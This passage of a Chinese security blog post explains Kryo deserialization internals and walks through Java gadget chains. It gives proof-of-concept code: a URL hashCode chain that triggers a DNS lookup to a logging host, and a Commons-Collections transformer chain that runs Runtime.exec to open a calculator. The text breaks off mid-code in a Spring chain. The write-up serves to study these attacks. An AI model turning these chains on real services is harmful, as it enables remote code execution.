class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(MyClass.class);</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        myClass.setHello(<span class="string">&quot;Hello Kryo&quot;</span>);</span><br><span class="line">        myClass.setNum(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output, myClass);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="3种序列化与反序列化"><a href="#3种序列化与反序列化" class="headerlink" title="3种序列化与反序列化"></a>3种序列化与反序列化</h3><p>如果是知道序列化类型，并且不为空<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeObject(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObject(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果是知道序列化类型，并且有可能为空<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeObjectOrNull(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果都是不确定的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeClassAndObject(output, object);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line"><span class="keyword">if</span> (object <span class="keyword">instanceof</span> SomeClass) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="kryo注册"><a href="#kryo注册" class="headerlink" title="kryo注册"></a>kryo注册</h3><blockquote><p>当不知道序列化的类是什么的时候可以不用注册，一般是为了提高反序列化的效率启用这种注册功能。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class);</span><br><span class="line"><span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> ...</span><br><span class="line">kryo.writeObject(output, object);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class, <span class="number">9</span>);</span><br><span class="line">kryo.register(AnotherClass.class, <span class="number">10</span>);</span><br><span class="line">kryo.register(YetAnotherClass.class, <span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>看到上面两段代码，第一个没有id，他会自动给你分配id，后面那段是在参数中提供id，这个id在序列化和反序列化的时候要保持一致，不能用9的去反序列化10的</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>首先获取前面获取的register<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt><br>然后就开始写入序列化数据<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt><br>最后会根据serializer类型写入序列化数据，在这里的serializer就是string类型的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt><br>更加详细的就不说了，还是得自己调试才行，总体流程就是</p><ul><li>获取registration</li><li>获取filed，进行filed.write</li><li>在write中获取相对应的serializer</li><li>调用serializer.write，进行最后的写入</li></ul><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化的流程与序列化基本一致，只不过就是把write改为了read<br>当反序列化的类型为一个Object类型的时候，可以看到如下的过程，先创建一个Object的实例，接着循环把成员变量那些给赋值上<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br>看看Create中的实现<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>他主要有几个步骤</p><ul><li>获取到无参构造</li><li>如果是private类型，就先让他变成可以访问的 -&gt; <em>ctor.setAccessible(true);</em></li><li>调用无参构造函数，并返回该实例</li></ul><p>但是有些利用链可能没有无参构造这时候应该怎么办<br>看到官网<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p><blockquote><p>The Objenesis StdInstantiatorStrategy uses JVM specific APIs to create an instance of a class without calling any constructor at all. Using this is dangerous because most classes expect their constructors to be called.<br><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));</code><br>当设置这个策略的时候会不调用任何的构造函数</p></blockquote><h2 id="常用调用链"><a href="#常用调用链" class="headerlink" title="常用调用链"></a>常用调用链</h2><p>常用的调用链基本是因为HashMap.put中,会调用到key的equals方法和hashcode方法，而key又是我们可控的，这时候就可以进行一些常规的调用链利用了<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt><br>首先看到他先反序列化了key，接着反序列化了value，最后进行了put操作</p><h3 id="hashCode利用"><a href="#hashCode利用" class="headerlink" title="hashCode利用"></a>hashCode利用</h3><p><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" alt><br>可以看到hash中触发了key的hashcode方法</p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>首先是最简单的URL利用链<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://x.xxx.tu4.org&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>具体就不分析了，就是会触发URL.hashcode最后触发dnslog</p><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a><h3 style="text-decoration: line-through;">TiedMapEntry</h3></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.Test.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">mp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;lsf&quot;</span>);</span><br><span class="line">        lazymap.clear();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazymap,ct);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> tiedMapEntry;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按理来说应该是可以触发的，但是设置了<br><code>new StdInstantiatorStrategy()</code><br>反序列化的create方法会把TiedMapEntry中的map变量名认成是value<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt><br>导致无法利用</p><h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><p>首先要触发到equals必须要有两个元素（node），而且该元素必须是同一类的，来看看HashMap的putVal源码看看为什么<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt><br>如果两个类都不是同一个类，就会直接进入到该if当中，而不会执行下面的equals。<br>接下来看看具体的代码</p><h4 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.support.GenericMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 